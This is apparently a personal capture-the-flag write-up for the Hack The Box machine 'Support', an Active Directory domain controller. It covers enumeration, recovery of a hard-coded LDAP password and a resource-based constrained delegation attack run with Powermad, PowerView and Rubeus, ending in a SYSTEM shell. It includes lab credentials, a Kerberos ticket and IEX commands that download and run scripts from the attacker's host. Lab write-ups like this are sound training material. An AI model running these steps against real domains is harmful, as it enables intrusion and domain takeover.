# Reconnaissance
- 
## Nmap Enumeration
- We pass these commands:
```bash
nmap -sV -sC -vv 10.10.11.174
nmap -sU --top-ports=10 -vv 10.10.11.174

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-05 13:53:52Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19493/tcp): CLEAN (Timeout)
|   Check 2 (port 49048/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 56910/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-04-05T13:53:57
|_  start_date: N/A
--------------------------------------------------------------------------------
---OUTPUT-UDP---
53/udp   open          domain       udp-response ttl 127
67/udp   open|filtered dhcps        no-response
123/udp  open          ntp          udp-response ttl 127
135/udp  open|filtered msrpc        no-response
137/udp  open|filtered netbios-ns   no-response
138/udp  open|filtered netbios-dgm  no-response
161/udp  open|filtered snmp         no-response
445/udp  open|filtered microsoft-ds no-response
631/udp  open|filtered ipp          no-response
1434/udp open|filtered ms-sql-m     no-response
```
- Port 139 is SMB
- LDAP is running
- What open port on Support allows a user in the Remote Management Users group to run PowerShell commands and get an interactive shell?
- 5985
## SMB Enumeration
- We pass these initial SMB commands in smbclient and get the same output for all (no password entered):
```bash
smbclient -U '' -L //10.10.11.174
smbclient -U 'guest' -L //10.10.11.174
smbclient -U 'anonymous' -L //10.10.11.174

---OUTPUT-ALL-NO-PWD---
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```
- We check support-tools as its not part of the normal share files found
```bash
smbclient //10.10.11.174/support-tools -N

---OUTPUT---
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

```
- I got the file, unzipped it and read it :
```bash
smb: > get UserInfo.exe.zip

---Local-Machine---
unzip UnserInfo.exe.zip
cat UserInfo.exe.config

---OUTPUT---
<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
...
<assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />

```
- We try to execute UserInfo.exe
- Needed to install 
- mono-complete
- dotnet (already installed)
- Failed to connect
## Wireshark
- We open up wireshark to check whats going on and we find some credentials
- ![[Pasted image 20250405171715.png]]
- `ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
- We try crackmapexec SMB with these credentials and get a hit
```bash
 crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

---OUTPUT---
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
## ALTERNATE METHOD : Using static analysis of the .net file to gain user ldap password:
- I used dnSPy (ILSpy for Kali) to analyse the UserInfo.exe file
- Under Userinfo.exe>UserInfo.Services we see our LDAP query.
```bash
string.Password = Protected.getPassword()
```
- Below it we find a code Protected with a private static key 
- `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
- ![[Pasted image 20250405223608.png]]

- The code :
```bash
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
```
- It's taking this base64 strin and putting it in an array
- Then it is XOR'ing it (`^`) with a key (`armando`) and then XOR'ing it again with 223
- In hex 223 is DF (0xDF created this box)
- To decrypt this password we use:
- CyberChef (From Base64): https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=VTI4Z2JHOXVaeUJoYm1RZ2RHaGhibXR6SUdadmNpQmhiR3dnZEdobElHWnBjMmd1
- the first XOR with armando we need to choose UTF8 or Latin1 (Definitely NOT HEX)
- The second one we put decimal 
- ![[Pasted image 20250405224659.png]]
- We get the password : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
## BloodHound Enumeration
- Object ID above 1000 are non default accounts
- admin is 500
- bloodhound commands:
```bash
bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c all
```
- We don't find much
- **Bloodhound looks for info in Description tab but there is also an info tab**
## Initial Foothold with LDAPsearch and SMB (with crackmapexec) 
**Note: Another GUI friendly tool instead of ldapsearch that can be used for this enumeration is Apache Directory Studio**
- we pass the command:
```bash
ldapsearch -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > ldap.out
```
- We vi into it and search for "info:" via / command:
```bash
vi ldap.out
> /info:

--OR--
cat ldap.out | grep "info:"

---OUTPUT---
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
...
info: Ironside47pleasure40Watchful
...
sAMAccountName: support
```
- we find some creds : support : Ironside47pleasure40Watchful
- We try crackmapexec SMB with these credentials and get a match:
```bash
crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'

---OUTPUT---
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
```
- At this point we can use evil-winrm to login to the machine as support and grab the user flag.
```bash
evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
cd ..
cd Desktop
type user.txt
```
----------
## Privilege Escalation with BloodHound
- **We then set support@support.htb user in bloodhound as owned**,
- With this we can see possible paths to exploit from this owned user (or future owned users later)
- We also set it as high value and set ldap user as owned too
- we also set SHARED SUPPORT ACCOUNTS@SUPPORT.HTB as high value too
- We check the Shortest Path to Owned principles and see a link to DC.support.htb
- We also check Outbound Object Control > Group Delegated Object Control for used support
- It shows us the Shared Support Account@support.htb account
- We see Generic All against DC
- If we right click and help and go under Windows Abuse we can see details for exploit
- We need to install the dependencies :
- Powermad : https://github.com/Kevin-Robertson/Powermad
- Powerview : https://github.com/PowerShellMafia/PowerSploit
- Rubeus.exe : https://github.com/Flangvik/SharpCollection
- Send it to target :
```bash
---Local-Machine---
python -m http.server 8001  # at location of files to send

---Target-Machine---
curl http://10.10.14.25:8001/Rubeus.exe -o Rubeus.exe
curl http://10.10.14.25:8001/PowerView.ps1 -o PowerView.ps1
curl http://10.10.14.25:8001/Powermad.ps1 -o Powermad.ps1
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/Powermad.ps1')
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/PowerView.ps1')
```
## Generic-All Exploit
- We first test if we can create new machines:
```PowerShell
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

---OUTPUT---
ms-ds-machineaccountquota
-------------------------
                       10
```
- By default any windows domain user can create upto 10 machines
- Should change to harden system
- Now we start the attack (from bloodhound info):
- First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
```bash
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

---OUTPUT---
[+] Machine account attackersystem added
```
- PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account::
```bash
> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
> $ComputerSid

---OUTPUT---
S-1-5-21-1677581083-3380853377-188903654-5601
```
	**NOTE: Password should probably follow one uppercase, one lowercase, one number, one special character atleast to make sure we don't come across issues if password complexity was set**
- We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE (this should give us authentication on behalf of the user):
```bash
> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
> $SD
> $SDBytes = New-Object byte[] ($SD.BinaryLength)
> $SD.GetBinaryForm($SDBytes, 0)

---OUTPUT-$SD---
ControlFlags           : DiscretionaryAclPresent, SelfRelative
Owner                  : S-1-5-32-544
Group                  :
SystemAcl              :
DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
ResourceManagerControl : 0
BinaryLength           : 80
```
- Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case (settnig the ms allow.. to act on behalf of the bytes we just created):
```bash
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
- Execute Rubeus
```bash
.\Rubeus.exe hash /password:Summer2018!

---OUTPUT---
[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
```
- S4U (delegation attack) :And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
- this what allow you to impersonate users (constrained authentication)
```bash
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt

---OUTPUT---
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
[+] Ticket successfully imported!
```
- We actually get 3 tickets :

| No. | Ticket    | Purpose                                    | Ticket Output                    | Usefulness             |
| --- | --------- | ------------------------------------------ | -------------------------------- | ---------------------- |
| 1.  | AS-REQ    | Authenticate as service account            | TGT for `attackersystem$`        | Needed setup           |
| 2.  | S4U2Self  | Impersonate admin to self                  | TGS: admin → `attackersystem$`   | Intermediate Step      |
| 3.  | S4U2Proxy | Impersonate admin to target service (CIFS) | TGS: admin → cifs/dc.support.htb | **We use this ticket** |

- Copy to vi and clean with %s/ //g
- decode base64 and convert to ccache for psexec to use
```bash
vi ticket.bs64 # Copy and clean ticket
base64 -d ticket.bs64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
KS
```
- Access system with ticket:
```bash
KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```
- What is the name of the environment variable on our local system that we'll set to that ccache file to allow use of files like psexec.py with the -k and -no-pass options?
- KRB5CCNAME
- We login as NT authority   
- **NOTE: sometimes ticket may not work due to a timing issue, or editing the code like renaming machine name etc. I had to reset my box to make it work properly**


